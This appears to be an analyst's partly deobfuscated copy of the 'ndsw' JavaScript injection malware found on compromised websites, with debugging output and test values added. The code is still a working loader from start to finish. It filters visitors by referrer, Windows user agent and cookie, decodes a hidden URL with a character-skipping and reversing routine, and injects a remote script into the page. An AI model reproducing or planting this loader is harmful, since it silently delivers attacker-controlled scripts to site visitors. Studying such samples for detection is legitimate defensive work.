
      var ndsw=true;
      function main() {

         var n=navigator,
         d=document,
         s=screen,
         w=window,
         // userAgent
         userAgent=navigator["userAgent"],
         // platform
         platform=navigator["platform"],
         //cookie
         cookie="asd",//document["cookie"],
         //location - hostname
         location="Windows",//window["location"]["hostname"],
         // referrer
         referrer="Win"//document["referrer"];
         console.log(userAgent);
         console.log(platform);
         console.log(cookie);
         console.log(location);
         console.log(referrer);

         if( referrer && !compareExist(referrer,location) ){
           console.log('1 stage');

           if( !compareExist(userAgent, paratlanString("kd0iio1rkdxnwA5")) &&
               compareExist(userAgent, paratlanString("ps5wdowdcn)i8Wv")) &&
               compareExist(platform, paratlanString("vndisWv"))) {
                 console.log('2 stage');

             if( !compareExist( cookie, paratlanString("m=ua!mft3uc_e_i") ) ){
                 console.log('3 stage');
               var n=d.createElement('script');
               n.type='text/javascript';
               n.async=true;
               n.src=paratlanString('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');
               var v=d.getElementsByTagName('script')[0];
               v.parentNode.insertBefore(n,v);
             }
           }
         }

      }

      /**
      * return string of the params odd indexs chars
      * @param {string} e
      * @return {string} k
      */
      function paratlanString(e){
       var k='';
       //
       for(var w=0;w<e.length;w++){
         if(w%2===1)k+=e[w]
       }

       k=reverseString(k);
       console.log('paratlanString - ' + k);
       return k
      }

      function compareExist(obj,param){
       console.log('compareExist - ' + obj + ' & ' + param);
       return obj[paratlanString("!f9O4xrevd4ngi4")](param)!==-1
      }

      function reverseString(a){
       var d='';
       for(var q=a.length-1;q>=0;q--){
         d+=a[q]
       }
       //console.log('reverseString - ' + d);
       return d
      }
      main()
